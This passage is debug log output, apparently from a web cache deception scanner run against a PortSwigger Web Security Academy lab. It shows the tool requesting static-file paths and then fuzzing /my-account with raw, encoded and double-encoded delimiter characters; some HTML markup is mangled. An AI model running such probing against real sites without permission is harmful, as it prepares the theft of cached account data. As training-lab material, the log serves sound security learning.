href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.js">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.js</a><br>2025/10/23 20:44:57 [DEBUG] Requesting URL (2/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.js">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.js</a><br>2025/10/23 20:44:58 [DEBUG] Requesting URL (3/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.js">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.js</a><br>2025/10/23 20:44:58 [DEBUG] Requesting URL (1/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.css">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.css</a><br>2025/10/23 20:44:58 [DEBUG] Requesting URL (2/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.css">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.css</a><br>2025/10/23 20:44:58 [DEBUG] Requesting URL (3/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.css">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.css</a><br>2025/10/23 20:44:58 [DEBUG] Requesting URL (1/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.jpg">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.jpg</a><br>2025/10/23 20:44:58 [DEBUG] Requesting URL (2/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.jpg">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.jpg</a><br>2025/10/23 20:44:59 [DEBUG] Requesting URL (3/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.jpg">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.jpg</a><br>2025/10/23 20:44:59 [DEBUG] Requesting URL (1/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.png">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.png</a><br>2025/10/23 20:44:59 [DEBUG] Requesting URL (2/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.png">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.png</a><br>2025/10/23 20:44:59 [DEBUG] Requesting URL (3/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.png">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.png</a><br>2025/10/23 20:44:59 [DEBUG] Requesting URL (1/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.gif">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.gif</a><br>2025/10/23 20:45:00 [DEBUG] Requesting URL (2/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.gif">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.gif</a><br>2025/10/23 20:45:00 [DEBUG] Requesting URL (3/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.gif">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.gif</a><br>2025/10/23 20:45:00 [DEBUG] Requesting URL (1/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.svg">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.svg</a><br>2025/10/23 20:45:00 [DEBUG] Requesting URL (2/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.svg">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.svg</a><br>2025/10/23 20:45:00 [DEBUG] Requesting URL (3/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.svg">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.svg</a><br>2025/10/23 20:45:00 [DEBUG] Requesting URL (1/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.woff">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.woff</a><br>2025/10/23 20:45:01 [DEBUG] Requesting URL (2/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.woff">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.woff</a><br>2025/10/23 20:45:01 [DEBUG] Requesting URL (3/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.woff">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.woff</a><br>2025/10/23 20:45:01 [DEBUG] Requesting URL (1/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.woff2">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.woff2</a><br>2025/10/23 20:45:01 [DEBUG] Requesting URL (2/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.woff2">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.woff2</a><br>2025/10/23 20:45:01 [DEBUG] Requesting URL (3/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.woff2">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.woff2</a><br>2025/10/23 20:45:02 [DEBUG] Requesting URL (1/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.ttf">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.ttf</a><br>2025/10/23 20:45:02 [DEBUG] Requesting URL (2/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.ttf">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.ttf</a><br>2025/10/23 20:45:02 [DEBUG] Requesting URL (3/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.ttf">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.ttf</a><br>2025/10/23 20:45:02 [DEBUG] Requesting URL (1/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.eot">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.eot</a><br>2025/10/23 20:45:02 [DEBUG] Requesting URL (2/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.eot">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.eot</a><br>2025/10/23 20:45:03 [DEBUG] Requesting URL (3/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.eot">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a.eot</a><br>2025/10/23 20:45:03 [DEBUG] 正在为分隔符检测选择基础URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account</a><br>2025/10/23 20:45:03 [DEBUG] 正在测试分隔符 (来自字典): ‘!’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account!aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account!aa</a><br>2025/10/23 20:45:03 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%21’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%21aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%21aa</a><br>2025/10/23 20:45:03 [DEBUG] 正在测试分隔符 (来自字典): ‘“‘, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account&quot;aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account&quot;aa</a><br>2025/10/23 20:45:04 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%22’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%22aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%22aa</a><br>2025/10/23 20:45:04 [DEBUG] 正在测试分隔符 (来自字典): ‘#’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account#aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account#aa</a><br>2025/10/23 20:45:04 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%23’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%23aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%23aa</a><br>2025/10/23 20:45:04 [DEBUG] 正在测试分隔符 (来自字典): ‘$’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account$aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account$aa</a><br>2025/10/23 20:45:05 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%24’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%24aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%24aa</a><br>2025/10/23 20:45:05 [DEBUG] 正在测试分隔符 (来自字典): ‘%’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%aa</a><br>2025/10/23 20:45:05 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%25’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%25aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%25aa</a><br>2025/10/23 20:45:05 [DEBUG] 正在测试分隔符 (来自字典): ‘&amp;’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account&amp;aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account&amp;aa</a><br>2025/10/23 20:45:05 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%26’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%26aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%26aa</a><br>2025/10/23 20:45:05 [DEBUG] 正在测试分隔符 (来自字典): ‘’’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account&#39;aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account&#39;aa</a><br>2025/10/23 20:45:06 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%27’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%27aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%27aa</a><br>2025/10/23 20:45:06 [DEBUG] 正在测试分隔符 (来自字典): ‘(‘, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account(aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account(aa</a><br>2025/10/23 20:45:06 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%28’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%28aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%28aa</a><br>2025/10/23 20:45:06 [DEBUG] 正在测试分隔符 (来自字典): ‘)’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account)aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account)aa</a><br>2025/10/23 20:45:06 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%29’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%29aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%29aa</a><br>2025/10/23 20:45:07 [DEBUG] 正在测试分隔符 (来自字典): ‘</em>‘, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account*aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account*aa</a><br>2025/10/23 20:45:07 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2A’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2Aaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2Aaa</a><br>2025/10/23 20:45:07 [DEBUG] 正在测试分隔符 (来自字典): ‘+’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account+aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account+aa</a><br>2025/10/23 20:45:07 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2Baa</a><br>2025/10/23 20:45:07 [DEBUG] 正在测试分隔符 (来自字典): ‘,’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account,aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account,aa</a><br>2025/10/23 20:45:07 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2Caa</a><br>2025/10/23 20:45:08 [DEBUG] 正在测试分隔符 (来自字典): ‘-‘, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account-aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account-aa</a><br>2025/10/23 20:45:08 [DEBUG] 正在测试分隔符 (来自字典): ‘.’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account.aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account.aa</a><br>2025/10/23 20:45:08 [DEBUG] 正在测试分隔符 (来自字典): ‘/‘, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account/aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account/aa</a><br>2025/10/23 20:45:08 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2F’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2Faa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2Faa</a><br>2025/10/23 20:45:09 [DEBUG] 正在测试分隔符 (来自字典): ‘:’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account:aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account:aa</a><br>2025/10/23 20:45:09 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%3A’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%3Aaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%3Aaa</a><br>2025/10/23 20:45:09 [DEBUG] 正在测试分隔符 (来自字典): ‘;’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account;aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account;aa</a><br>2025/10/23 20:45:09 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%3B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%3Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%3Baa</a><br>2025/10/23 20:45:09 [DEBUG] 正在测试分隔符 (来自字典): ‘&lt;’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account</a><aa2025/10/23 20:45:10 [DEBUG] 正在测试分隔符 (字典条目编码后): '%3C', URL: https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%3Caa2025/10/23 20:45:10 [DEBUG] 正在测试分隔符 (来自字典): '=', URL: https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account=aa2025/10/23 20:45:10 [DEBUG] 正在测试分隔符 (字典条目编码后): '%3D', URL: https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%3Daa2025/10/23 20:45:10 [DEBUG] 正在测试分隔符 (来自字典): '>', URL: https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account>aa<br>2025/10/23 20:45:10 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%3E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%3Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%3Eaa</a><br>2025/10/23 20:45:11 [DEBUG] 正在测试分隔符 (来自字典): ‘?’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account?aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account?aa</a><br>2025/10/23 20:45:11 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%3F’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%3Faa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%3Faa</a><br>2025/10/23 20:45:11 [DEBUG] 正在测试分隔符 (来自字典): ‘@’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account@aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account@aa</a><br>2025/10/23 20:45:11 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%40’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%40aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%40aa</a><br>2025/10/23 20:45:11 [DEBUG] 正在测试分隔符 (来自字典): ‘[‘, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account[aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account[aa</a><br>2025/10/23 20:45:12 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%5B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%5Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%5Baa</a><br>2025/10/23 20:45:12 [DEBUG] 正在测试分隔符 (来自字典): ‘\’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account\aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account\aa</a><br>2025/10/23 20:45:12 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%5C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%5Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%5Caa</a><br>2025/10/23 20:45:12 [DEBUG] 正在测试分隔符 (来自字典): ‘]’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account]aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account]aa</a><br>2025/10/23 20:45:12 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%5D’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%5Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%5Daa</a><br>2025/10/23 20:45:13 [DEBUG] 正在测试分隔符 (来自字典): ‘^’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account^aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account^aa</a><br>2025/10/23 20:45:13 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%5E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%5Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%5Eaa</a><br>2025/10/23 20:45:13 [DEBUG] 正在测试分隔符 (来自字典): ‘<em>‘, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account_aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account_aa</a><br>2025/10/23 20:45:13 [DEBUG] 正在测试分隔符 (来自字典): ‘<code>&#39;, URL: https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account</code>aa<br>2025/10/23 20:45:13 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%60’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%60aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%60aa</a><br>2025/10/23 20:45:13 [DEBUG] 正在测试分隔符 (来自字典): ‘{‘, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account{aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account{aa</a><br>2025/10/23 20:45:14 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%7B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%7Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%7Baa</a><br>2025/10/23 20:45:14 [DEBUG] 正在测试分隔符 (来自字典): ‘|’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account|aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account|aa</a><br>2025/10/23 20:45:14 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%7C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%7Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%7Caa</a><br>2025/10/23 20:45:14 [DEBUG] 正在测试分隔符 (来自字典): ‘}’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account}aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account}aa</a><br>2025/10/23 20:45:14 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%7D’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%7Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%7Daa</a><br>2025/10/23 20:45:15 [DEBUG] 正在测试分隔符 (来自字典): ‘~’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account~aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account~aa</a><br>2025/10/23 20:45:15 [DEBUG] 正在测试分隔符 (来自字典): ‘%21’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%21aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%21aa</a><br>2025/10/23 20:45:15 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2521’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2521aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2521aa</a><br>2025/10/23 20:45:15 [DEBUG] 正在测试分隔符 (来自字典): ‘%22’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%22aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%22aa</a><br>2025/10/23 20:45:15 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2522’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2522aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2522aa</a><br>2025/10/23 20:45:15 [DEBUG] 正在测试分隔符 (来自字典): ‘%23’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%23aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%23aa</a><br>2025/10/23 20:45:16 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2523’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2523aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2523aa</a><br>2025/10/23 20:45:16 [DEBUG] 正在测试分隔符 (来自字典): ‘%24’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%24aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%24aa</a><br>2025/10/23 20:45:16 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2524’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2524aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2524aa</a><br>2025/10/23 20:45:16 [DEBUG] 正在测试分隔符 (来自字典): ‘%25’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%25aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%25aa</a><br>2025/10/23 20:45:16 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2525’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2525aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2525aa</a><br>2025/10/23 20:45:17 [DEBUG] 正在测试分隔符 (来自字典): ‘%26’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%26aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%26aa</a><br>2025/10/23 20:45:17 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2526’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2526aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2526aa</a><br>2025/10/23 20:45:17 [DEBUG] 正在测试分隔符 (来自字典): ‘%27’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%27aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%27aa</a><br>2025/10/23 20:45:17 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2527’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2527aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2527aa</a><br>2025/10/23 20:45:17 [DEBUG] 正在测试分隔符 (来自字典): ‘%28’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%28aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%28aa</a><br>2025/10/23 20:45:17 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2528’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2528aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2528aa</a><br>2025/10/23 20:45:18 [DEBUG] 正在测试分隔符 (来自字典): ‘%29’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%29aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%29aa</a><br>2025/10/23 20:45:18 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2529’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2529aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2529aa</a><br>2025/10/23 20:45:18 [DEBUG] 正在测试分隔符 (来自字典): ‘%2A’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2Aaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2Aaa</a><br>2025/10/23 20:45:18 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%252A’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%252Aaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%252Aaa</a><br>2025/10/23 20:45:18 [DEBUG] 正在测试分隔符 (来自字典): ‘%2B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2Baa</a><br>2025/10/23 20:45:18 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%252B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%252Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%252Baa</a><br>2025/10/23 20:45:19 [DEBUG] 正在测试分隔符 (来自字典): ‘%2C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%2Caa</a><br>2025/10/23 20:45:19 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%252C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%252Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account%252Caa</a><br>2025/10/23 20:45:19 [DEBUG] 正在测试分隔符 (来自字典): ‘%2D’, URL: <a 